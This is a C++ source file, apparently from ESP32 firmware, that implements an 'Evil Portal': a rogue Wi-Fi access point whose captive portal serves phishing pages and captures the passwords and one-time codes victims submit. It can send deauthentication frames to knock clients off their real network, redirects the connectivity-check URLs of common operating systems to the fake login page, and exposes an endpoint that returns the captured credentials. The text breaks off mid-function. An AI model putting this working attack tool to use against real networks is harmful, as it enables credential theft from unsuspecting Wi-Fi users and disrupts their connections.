#include "evil_portal.h"
#include "core/config.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "wifi_atks.h"

static DNSServer &sharedEvilPortalDnsServer() {
    static DNSServer server;
    return server;
}

// Generate a random 6-digit OTP
String generateOTP() {
    String otp = "";
    for (int i = 0; i < 6; i++) {
        otp += String(random(0, 10));
    }
    return otp;
}

EvilPortal::EvilPortal(
    String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode,
    String templateFile
)
    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
      _backgroundMode(backgroundMode), _autoTemplateFile(templateFile), webServer(80), _launchTime(millis()) {
    dnsServer = &sharedEvilPortalDnsServer();

    _originalWifiMode = WiFi.getMode();
    _wifiWasConnected = WiFi.isConnected();

    if (!setup()) return;
    cleanlyStopWebUiForWiFiFeature();
    beginAP();
    if (!_backgroundMode) { loop(); }
}

EvilPortal::~EvilPortal() {}

void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    AsyncResponseStream *response = request->beginResponseStream("text/html");
    String url = request->url();
    if (url == "/") _portal->portalController(request);
    else if (url == "/post") _portal->credsController(request);
    else if (url == "/verify-otp") _portal->otpController(request);
    else if (
        url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
        bruceConfig.evilPortalEndpoints.allowGetCreds
    )
        request->send(200, "text/html", _portal->creds_GET());
    else if (
        url == bruceConfig.evilPortalEndpoints.setSsidEndpoint && bruceConfig.evilPortalEndpoints.allowSetSsid
    ) {
        if (request->hasArg("ssid")) {
            _portal->apName = request->arg("ssid").c_str();
            request->send(200, "text/html", _portal->ssid_POST());
            _portal->_pendingWifiRestart = true;
        } else {
            request->send(200, "text/html", _portal->ssid_GET());
        }
    } else {
        if (request->args() > 0) _portal->credsController(request);
        else _portal->portalController(request);
    }
}

bool EvilPortal::setup() {
    if (apGateway == IPAddress((uint32_t)0)) {
        if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
    }

    if (_autoMode) {
        if (apName.isEmpty()) apName = "Free Wifi";
        if (!_autoTemplateFile.isEmpty() && loadCustomHtmlFromPath(_autoTemplateFile)) { return true; }
        if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
            apName.indexOf("firmware") != -1 || _verifyPwd) {
            loadDefaultHtml_one();
        } else {
            loadDefaultHtml();
        }
        return true;
    }

    options = {
        {"Custom Html", [this]() { loadCustomHtml(); }}
    };
    addOptionToMainMenu();

    if (!_verifyPwd) {
        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); }});
    } else {
        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
    }

    loopOptions(options);
    if (returnToMenu) return false;

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_raw_frame(&ap_record, _channel);

    if (apName.isEmpty()) {
        if (bruceConfig.evilWifiNames.empty()) {
            apName_from_keyboard();
        } else {
            options = {
                {"Custom Wifi", [this]() { apName_from_keyboard(); }}
            };
            for (const auto &_wifi : bruceConfig.evilWifiNames) {
                options.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
            }
            loopOptions(options);
        }
    }

    options = {
        {"Default",
         [this]() {
             if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
         }                                                                 },
        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
        {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
    };

    loopOptions(options);

    Serial.println("Evil Portal output file: " + outputFile);
    return true;
}

void EvilPortal::beginAP() {
    if (!_backgroundMode) {
        drawMainBorderWithTitle("EVIL PORTAL");
        displayTextLine("Starting...");
    }
    if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
    else WiFi.mode(WIFI_MODE_AP);

    if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
        Serial.println("[PORTAL] softAPConfig failed");
    }
    if (!WiFi.softAP(apName, emptyString, _channel)) {
        Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
    }
    wifiConnected = true;

    int tmp = millis();
    while (millis() - tmp < 3000) yield();

    setupRoutes();
    dnsServer->start(53, "*", WiFi.softAPIP());
    webServer.begin();
}

void EvilPortal::setupRoutes() {
    webServer.on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(
            200,
            "text/html",
            "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + WiFi.softAPIP().toString() +
                "\"></head><body></body></html>"
        );
    });

    webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/ncsi.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/connecttest.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/success.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/canonical.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/fwlink", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/detectportal.firefox.com/success.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
    webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
    webServer.on("/verify-otp", [this](AsyncWebServerRequest *request) { otpController(request); });

    if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
        webServer.on(
            bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
        );
    }*
